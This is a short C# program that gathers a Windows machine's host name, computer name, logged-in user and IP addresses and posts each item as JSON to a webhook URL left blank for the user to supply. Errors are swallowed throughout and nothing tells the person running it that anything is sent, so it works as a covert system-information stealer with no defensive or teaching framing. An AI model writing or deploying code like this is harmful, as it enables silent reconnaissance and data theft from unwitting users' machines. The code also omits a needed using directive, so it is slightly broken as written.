using System.Net;
using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text.Json;
using System.Text;

class Program
{
    static async Task Main(string[] args)
    {
        List<string> list = new List<string>();
        list.Add($"--------------------------------------------------");
        list.Add(DateTime.Now.ToString("yyyy.MM.dd:HH.mm.ss:FFFFF"));
        list.Add("NEW DEVICE DETECTED! Collecting local data:");
        try
        {
            list.Add(System.Net.Dns.GetHostName());
        }
        catch { }
        try
        {
            list.Add(System.Environment.GetEnvironmentVariable("COMPUTERNAME"));
        }catch { }
        try
        {
            list.Add(System.Security.Principal.WindowsIdentity.GetCurrent().Name);
        }
        catch { }
        try
        {
            string hostname = Dns.GetHostName();
            IPHostEntry IpAdress = Dns.GetHostEntry(hostname);
            IPHostEntry ipEntry = Dns.GetHostEntry(hostname);
            IPAddress[] addr = ipEntry.AddressList;
            for(int i = 0; i < addr.Length; i++)
            {
                list.Add(addr[i].ToString());
            }
        }
        catch { }
        list.Add("--------------------------------------------------");
        try
        {
            string webhookUrl = ""; //Your Webhook Url here!
            string message;
            for(int i = 0; i < list.Count; i++)
            {
                message = list[i].ToString();
                using (HttpClient client = new HttpClient())
                {
                    var payload = new
                    {
                        content = message
                    };

                    var jsonPayload = JsonSerializer.Serialize(payload);
                    var stringContent = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                    var result = await client.PostAsync(webhookUrl, stringContent);
                }
            }
            
        }
        catch { }
    }
}
